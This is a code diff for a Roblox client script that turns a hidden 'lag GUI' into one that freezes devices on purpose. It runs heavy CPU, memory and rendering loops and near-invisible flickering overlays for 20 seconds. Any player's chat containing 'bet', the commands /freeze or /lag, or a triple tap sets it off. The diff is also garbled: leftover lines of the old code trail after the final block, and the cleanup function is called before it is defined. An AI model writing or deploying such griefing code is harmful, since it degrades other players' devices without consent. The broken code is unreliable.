@@ -1,66 +1,311 @@
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "InvisibleLagGUI"
+screenGui.Name = "iOSLagGUI"
 screenGui.DisplayOrder = 9999
 screenGui.Enabled = true
 screenGui.Parent = playerGui
 
 local mainContainer = Instance.new("Frame")
-mainContainer.Name = "MainLagContainer"
-mainContainer.Size = UDim2.new(2, 0, 2, 0)
-mainContainer.Position = UDim2.new(0.8, 0, 0, 0)
+mainContainer.Name = "MainContainer"
+mainContainer.Size = UDim2.new(1, 0, 1, 0)
 mainContainer.BackgroundTransparency = 1
 mainContainer.Visible = true
+mainContainer.Active = false
 mainContainer.Parent = screenGui
 
 local isActive = false
-local createdFrames = {}
 local lagConnections = {}
 
-local function triggerExtremeLag()
+local function triggerIOSLag()
     if isActive then return end
     isActive = true
     
-    print("[EXTREME LAG ACTIVATED] Creating massive invisible lag...")
+    local cpuLagConnection = RunService.Heartbeat:Connect(function()
+        local result = 0
+        for i = 1, 100000 do
+            result = result + math.sin(i) * math.cos(i) / math.tan(i + 1)
+            result = result * math.random() * math.random()
+            result = result + math.sqrt(i) * math.log(i + 1)
+            result = result * math.exp(math.random())
+        end
+    end)
+    table.insert(lagConnections, cpuLagConnection)
     
-    for i = 1, 4800 do
-        local frame = Instance.new("Frame")
-        frame.Name = "LagFrame_" .. i
-        frame.Size = UDim2.new(0, math.random(100, 300), 0, math.random(100, 300))
-        frame.Position = UDim2.new(
-            math.random(0, 2), math.random(-500, 500),
-            math.random(0, 2), math.random(-500, 500)
-        )
-        frame.BackgroundTransparency = 1
-        frame.BorderSizePixel = 0
-        frame.Visible = true
-        frame.ZIndex = 999
-        frame.Active = false
+    local cpuLagConnection2 = RunService.RenderStepped:Connect(function()
+        local total = 0
+        for x = 1, 200 do
+            for y = 1, 200 do
+                total = total + math.sqrt(x^3 + y^3) * math.sin(x * y * 0.1)
+                total = total * math.cos(total) * math.tan(total)
+            end
+        end
+    end)
+    table.insert(lagConnections, cpuLagConnection2)
+    
+    local overlay = Instance.new("Frame")
+    overlay.Name = "LagOverlay"
+    overlay.Size = UDim2.new(1, 0, 1, 0)
+    overlay.BackgroundColor3 = Color3.new(0, 0, 0)
+    overlay.BackgroundTransparency = 0.99
+    overlay.Parent = mainContainer
+    
+    local overlayConnection = RunService.RenderStepped:Connect(function()
+        overlay.BackgroundTransparency = 0.95 + math.sin(tick() * 20) * 0.04
+        overlay.Size = UDim2.new(1 + math.sin(tick() * 10) * 0.02, 0, 
+                                1 + math.cos(tick() * 10) * 0.02, 0)
+        overlay.Rotation = math.sin(tick() * 15) * 5
+    end)
+    table.insert(lagConnections, overlayConnection)
+    
+    for layer = 1, 5 do
+        local extraOverlay = Instance.new("Frame")
+        extraOverlay.Size = UDim2.new(1, 0, 1, 0)
+        extraOverlay.BackgroundTransparency = 0.995
+        extraOverlay.BackgroundColor3 = Color3.new(layer/10, 0, 0)
+        extraOverlay.Parent = mainContainer
         
-        for j = 1, 15 do
-            local childFrame = Instance.new("Frame")
-            childFrame.Size = UDim2.new(1, 0, 1, 0)
-            childFrame.BackgroundTransparency = 1
-            childFrame.Visible = true
-            childFrame.Active = false
-            childFrame.Parent = frame
-            
-            local textLabel = Instance.new("TextLabel")
-            textLabel.Size = UDim2.new(1, 0, 1, 0)
-            textLabel.Text = "LAG" .. string.rep("X", math.random(50, 200))
-            textLabel.TextTransparency = 1
-            textLabel.TextWrapped = true
-            textLabel.BackgroundTransparency = 1
-            textLabel.Visible = true
-            textLabel.Active = false
-            textLabel.Parent = childFrame
-            
-            for k = 1, 3 do
-                local extraLabel = Instance.new("TextLabel")
+        local extraConnection = RunService.RenderStepped:Connect(function()
+            extraOverlay.Position = UDim2.new(
+                math.sin(tick() * (layer + 2)) * 0.01, 0,
+                math.cos(tick() * (layer + 2)) * 0.01, 0
+            )
+            extraOverlay.Rotation = math.cos(tick() * (layer + 5)) * 10
+        end)
+        table.insert(lagConnections, extraConnection)
+    end
+    
+    local inputConnection = RunService.Heartbeat:Connect(function()
+        for i = 1, 50 do
+            pcall(function()
+                local fakeInput = {
+                    KeyCode = Enum.KeyCode.A,
+                    UserInputType = Enum.UserInputType.Keyboard,
+                    UserInputState = Enum.UserInputState.Begin
+                }
+            end)
+        end
+    end)
+    table.insert(lagConnections, inputConnection)
+    
+    local memoryArray = {}
+    local memoryConnection = RunService.Heartbeat:Connect(function()
+        for i = 1, 2000 do
+            memoryArray[i] = string.rep("LAG", 2000)
+            memoryArray[i + 2000] = string.rep("X", 1000)
+            memoryArray[i + 4000] = string.rep("Y", 1500)
+        end
+        if #memoryArray > 30000 then
+            for i = 1, 10000 do
+                memoryArray[i] = nil
+            end
+        end
+    end)
+    table.insert(lagConnections, memoryConnection)
+    
+    local renderFrames = {}
+    for i = 1, 200 do
+        local frame = Instance.new("Frame")
+        frame.Size = UDim2.new(0.05, 0, 0.05, 0)
+        frame.Position = UDim2.new(math.random(), 0, math.random(), 0)
+        frame.BackgroundTransparency = 0.999
+        frame.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
+        frame.Parent = mainContainer
+        table.insert(renderFrames, frame)
+        
+        local frameConnection = RunService.RenderStepped:Connect(function()
+            frame.Position = UDim2.new(
+                (frame.Position.X.Scale + math.sin(tick() * (i/5)) * 0.02) % 1, 0,
+                (frame.Position.Y.Scale + math.cos(tick() * (i/5)) * 0.02) % 1, 0
+            )
+            frame.Rotation = math.sin(tick() * i * 2) * 720
+            frame.Size = UDim2.new(
+                0.05 + math.sin(tick() * (i/2)) * 0.1, 0,
+                0.05 + math.cos(tick() * (i/2)) * 0.1, 0
+            )
+        end)
+        table.insert(lagConnections, frameConnection)
+    end
+    
+    for particle = 1, 10 do
+        local particleFrame = Instance.new("Frame")
+        particleFrame.Size = UDim2.new(0.02, 0, 0.02, 0)
+        particleFrame.BackgroundTransparency = 0.998
+        particleFrame.BackgroundColor3 = Color3.new(1, 0, 0)
+        particleFrame.Parent = mainContainer
+        
+        local particleConnection = RunService.RenderStepped:Connect(function()
+            particleFrame.Position = UDim2.new(
+                math.sin(tick() * particle * 3) * 0.5 + 0.5, 0,
+                math.cos(tick() * particle * 3) * 0.5 + 0.5, 0
+            )
+        end)
+        table.insert(lagConnections, particleConnection)
+    end
+    
+    local networkConnection = RunService.Heartbeat:Connect(function()
+        for i = 1, 100 do
+            pcall(function()
+                local fakeData = {
+                    type = "update",
+                    data = string.rep("X", 5000),
+                    timestamp = tick()
+                }
+            end)
+        end
+    end)
+    table.insert(lagConnections, networkConnection)
+    
+    local physicsConnection = RunService.Stepped:Connect(function()
+        local total = 0
+        for x = 1, 300 do
+            for y = 1, 300 do
+                for z = 1, 5 do
+                    total = total + math.sqrt(x^2 + y^2 + z^2) * math.sin(x * y * z * 0.05)
+                    total = total * math.cos(total) * math.exp(math.random())
+                end
+            end
+        end
+    end)
+    table.insert(lagConnections, physicsConnection)
+    
+    local gcConnection = RunService.Heartbeat:Connect(function()
+        for i = 1, 500 do
+            local tempTable = {}
+            for j = 1, 200 do
+                tempTable[j] = string.rep("G", 500)
+                tempTable[j + 200] = string.rep("H", 500)
+            end
+        end
+    end)
+    table.insert(lagConnections, gcConnection)
+    
+    local stringConnection = RunService.Heartbeat:Connect(function()
+        local bigString = ""
+        for i = 1, 1000 do
+            bigString = bigString .. string.rep("LAG", 100)
+            if #bigString > 100000 then
+                bigString = ""
+            end
+        end
+    end)
+    table.insert(lagConnections, stringConnection)
+    
+    local tableConnection = RunService.Heartbeat:Connect(function()
+        local megaTable = {}
+        for i = 1, 1000 do
+            megaTable[i] = {}
+            for j = 1, 100 do
+                megaTable[i][j] = math.random() * math.random() * math.random()
+                megaTable[i][j + 100] = string.rep("Z", 200)
+            end
+        end
+    end)
+    table.insert(lagConnections, tableConnection)
+    
+    task.delay(20, function()
+        if isActive then
+            clearLag()
+        end
+    end)
+end
+
+local function clearLag()
+    if not isActive then return end
+    isActive = false
+    
+    for _, conn in pairs(lagConnections) do
+        pcall(function() conn:Disconnect() end)
+    end
+    lagConnections = {}
+    
+    for _, child in pairs(mainContainer:GetChildren()) do
+        pcall(function() child:Destroy() end)
+    end
+    
+    task.wait(0.5)
+    for i = 1, 5 do
+        collectgarbage()
+        task.wait(0.1)
+    end
+end
+
+local function setupChatDetection()
+    local function monitorPlayer(player)
+        player.Chatted:Connect(function(message)
+            local text = string.lower(message)
+            if string.find(text, "bet") and not isActive then
+                task.wait(0.5)
+                triggerIOSLag()
+            end
+        end)
+    end
+    
+    for _, player in pairs(Players:GetPlayers()) do
+        monitorPlayer(player)
+    end
+    
+    Players.PlayerAdded:Connect(monitorPlayer)
+    
+    pcall(function()
+        local TextChatService = game:GetService("TextChatService")
+        if TextChatService then
+            local channels = TextChatService:FindFirstChild("TextChannels")
+            if channels then
+                for _, channel in pairs(channels:GetChildren()) do
+                    if channel:IsA("TextChannel") then
+                        channel.OnMessageReceived:Connect(function(message)
+                            local text = string.lower(message.Text)
+                            if string.find(text, "bet") and not isActive then
+                                task.wait(0.5)
+                                triggerIOSLag()
+                            end
+                        end)
+                    end
+                end
+            end
+        end
+    end)
+end
+
+local function setupConsole()
+    player.Chatted:Connect(function(message)
+        local cmd = string.lower(message)
+        if cmd == "/freeze" and not isActive then
+            triggerIOSLag()
+        elseif cmd == "/unfreeze" then
+            clearLag()
+        elseif cmd == "/lag" and not isActive then
+            triggerIOSLag()
+        end
+    end)
+end
+
+setupChatDetection()
+setupConsole()
+
+if UserInputService.TouchEnabled then
+    local touchCount = 0
+    local lastTouchTime = 0
+    
+    UserInputService.TouchStarted:Connect(function()
+        local currentTime = tick()
+        if currentTime - lastTouchTime < 0.2 then
+            touchCount = touchCount + 1
+            if touchCount >= 3 and not isActive then
+                triggerIOSLag()
+                touchCount = 0
+            end
+        else
+            touchCount = 1
+        end
+        lastTouchTime = currentTime
+    end)
+end                local extraLabel = Instance.new("TextLabel")
                 extraLabel.Size = UDim2.new(0.5, 0, 0.5, 0)
                 extraLabel.Position = UDim2.new(math.random(), 0, math.random(), 0)
                 extraLabel.Text = string.rep("L", math.random(100, 500))
